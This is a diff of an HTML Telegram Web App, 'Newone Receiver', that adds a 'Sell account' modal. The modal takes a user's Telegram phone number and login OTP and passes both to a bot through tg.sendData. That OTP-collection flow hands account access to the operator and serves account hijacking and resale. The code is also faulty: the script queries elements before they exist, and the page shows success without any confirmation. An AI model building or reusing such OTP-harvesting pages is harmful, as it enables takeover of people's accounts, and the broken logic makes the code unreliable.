@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Newone Receiver</title>
+    <!-- সঠিক Telegram WebApp স্ক্রিপ্ট -->
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, sans-serif; }
@@ -39,6 +40,75 @@
         .nav-item { display: flex; flex-direction: column; align-items: center; color: #8a94a6; font-size: 10px; cursor: pointer; }
         .nav-item.active { color: #3182ce; }
         .nav-icon { font-size: 20px; margin-bottom: 4px; }
+
+        /* Sell modal overlay */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.7);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        .modal-content {
+            background: #1a202c;
+            padding: 30px 25px;
+            border-radius: 24px;
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+            color: white;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
+        .modal-content h2 {
+            margin-bottom: 20px;
+            font-size: 22px;
+        }
+        .modal-content input {
+            width: 100%;
+            padding: 14px 12px;
+            border-radius: 12px;
+            border: 1px solid #2d3748;
+            background: #0f1217;
+            color: white;
+            font-size: 16px;
+            margin-bottom: 15px;
+            outline: none;
+        }
+        .modal-content input:focus {
+            border-color: #3182ce;
+        }
+        .modal-content .btn {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-bottom: 10px;
+        }
+        .btn-primary { background: #3182ce; color: white; }
+        .btn-success { background: #38a169; color: white; }
+        .btn-danger { background: #e53e3e; color: white; }
+        .btn-secondary { background: #2d3748; color: white; }
+        .modal-content .status {
+            margin: 15px 0;
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 14px;
+        }
+        .step { display: block; }
+        .step.hidden { display: none; }
+        .back-link {
+            display: block;
+            margin-top: 12px;
+            color: #8a94a6;
+            font-size: 14px;
+            cursor: pointer;
+            text-decoration: underline;
+        }
     </style>
 </head>
 <body>
@@ -46,8 +116,97 @@
         const tg = window.Telegram.WebApp;
         tg.expand();
         tg.ready();
+
+        // DOM elements
+        const modal = document.getElementById('sellModal');
+        const stepPhone = document.getElementById('stepPhone');
+        const stepOtp = document.getElementById('stepOtp');
+        const stepSuccess = document.getElementById('stepSuccess');
+        const phoneInput = document.getElementById('phoneInput');
+        const otpInput = document.getElementById('otpInput');
+        const sendOtpBtn = document.getElementById('sendOtpBtn');
+        const verifyOtpBtn = document.getElementById('verifyOtpBtn');
+        const statusMsg = document.getElementById('statusMsg');
+        const successMsg = document.getElementById('successMsg');
+        const closeModalBtn = document.getElementById('closeModalBtn');
+
+        // Open modal on "Sell account" click
+        document.querySelector('.sell-btn').addEventListener('click', function(e) {
+            e.preventDefault();
+            modal.style.display = 'flex';
+            // reset to step 1
+            stepPhone.classList.remove('hidden');
+            stepOtp.classList.add('hidden');
+            stepSuccess.classList.add('hidden');
+            phoneInput.value = '';
+            otpInput.value = '';
+            statusMsg.textContent = '';
+            statusMsg.className = 'status';
+        });
+
+        // Close modal (optional back)
+        function closeModal() {
+            modal.style.display = 'none';
+        }
+        // back link to close (or you can add a close button)
+        document.getElementById('closeModalLink').addEventListener('click', closeModal);
+
+        // Send OTP
+        sendOtpBtn.addEventListener('click', function() {
+            const phone = phoneInput.value.trim();
+            if (!phone) {
+                statusMsg.textContent = 'Please enter your phone number.';
+                statusMsg.className = 'status';
+                statusMsg.style.color = '#e53e3e';
+                return;
+            }
+            // Send data to bot
+            const data = JSON.stringify({ action: 'send_otp', phone: phone });
+            tg.sendData(data);
+            // Show status
+            statusMsg.textContent = '📤 OTP sent to your Telegram. Please check your chat and enter it below.';
+            statusMsg.className = 'status';
+            statusMsg.style.color = '#3182ce';
+            // Move to step 2
+            stepPhone.classList.add('hidden');
+            stepOtp.classList.remove('hidden');
+        });
+
+        // Verify OTP
+        verifyOtpBtn.addEventListener('click', function() {
+            const otp = otpInput.value.trim();
+            if (!otp) {
+                statusMsg.textContent = 'Please enter the OTP.';
+                statusMsg.className = 'status';
+                statusMsg.style.color = '#e53e3e';
+                return;
+            }
+            const data = JSON.stringify({ action: 'verify_otp', otp: otp });
+            tg.sendData(data);
+            // Show waiting
+            statusMsg.textContent = '⏳ Verifying...';
+            statusMsg.className = 'status';
+            statusMsg.style.color = '#3182ce';
+            // Since we cannot get direct response, we'll show a note to check Telegram for result.
+            // But we can also listen for updates? Not possible easily, so we'll instruct user.
+            // We'll assume verification is done and show success after a short delay? Better to let user know to check Telegram.
+            // Actually, we can show a message that verification result will appear in chat.
+            statusMsg.textContent = '✅ OTP sent for verification. Please check your Telegram for confirmation. If successful, you can close this window.';
+            statusMsg.style.color = '#38a169';
+            // Optionally, we could enable a "close" button.
+            // For better UX, we can show a success step after some time, but better to rely on user.
+            // Let's add a manual "I verified" button? But we can't know if it's verified.
+            // We'll keep it simple: after sending, we show stepSuccess with instruction.
+            stepOtp.classList.add('hidden');
+            stepSuccess.classList.remove('hidden');
+            successMsg.textContent = '✅ Verification request sent. Check your Telegram for the result. If verified, you can now sell accounts.';
+        });
+
+        // Close modal from success step
+        document.getElementById('closeModalSuccess').addEventListener('click', closeModal);
     </script>
 
+    <!-- Main UI (অপরিবর্তিত) -->
     <div class="header">
         <div class="diamond-logo">💎</div>
         <h1>Newone Receiver</h1>
@@ -93,7 +252,36 @@
         </div>
 
         <div class="sell-btn-container">
-            <button class="sell-btn" onclick="alert('Account Sell Feature Coming Soon!')">+ Sell account</button>
+            <button class="sell-btn">+ Sell account</button>
+        </div>
+    </div>
+
+    <!-- Sell Modal -->
+    <div class="modal-overlay" id="sellModal">
+        <div class="modal-content">
+            <h2>Sell Account</h2>
+            <!-- Step 1: Phone -->
+            <div id="stepPhone" class="step">
+                <p style="margin-bottom:15px; color:#8a94a6;">Enter your Telegram phone number to receive OTP.</p>
+                <input type="tel" id="phoneInput" placeholder="Phone number (e.g., +8801...)" />
+                <button class="btn btn-primary" id="sendOtpBtn">Send OTP</button>
+                <div id="statusMsg" class="status"></div>
+            </div>
+            <!-- Step 2: OTP -->
+            <div id="stepOtp" class="step hidden">
+                <p style="margin-bottom:15px; color:#8a94a6;">Check your Telegram for the OTP code and enter here.</p>
+                <input type="text" id="otpInput" placeholder="Enter 6-digit OTP" maxlength="6" />
+                <button class="btn btn-success" id="verifyOtpBtn">Verify OTP</button>
+                <div id="statusMsg2" class="status"></div>
+                <span class="back-link" id="backToPhone">← Go back</span>
+            </div>
+            <!-- Step 3: Success -->
+            <div id="stepSuccess" class="step hidden">
+                <p style="color:#38a169; font-size:18px;">✅ Verification sent!</p>
+                <p id="successMsg" style="margin:15px 0; color:#8a94a6;">Check your Telegram for final confirmation.</p>
+                <button class="btn btn-secondary" id="closeModalSuccess">Close</button>
+            </div>
+            <span class="back-link" id="closeModalLink">Close</span>
         </div>
     </div>
 
@@ -103,5 +291,14 @@
         <div class="nav-item"><div class="nav-icon">📋</div>Orders</div>
         <div class="nav-item active"><div class="nav-icon">🏠</div>Home</div>
     </div>
+
+    <script>
+        // Additional JS for back to phone step
+        document.getElementById('backToPhone').addEventListener('click', function() {
+            document.getElementById('stepOtp').classList.add('hidden');
+            document.getElementById('stepPhone').classList.remove('hidden');
+            document.getElementById('statusMsg').textContent = '';
+        });
+    </script>
 </body>
 </html>
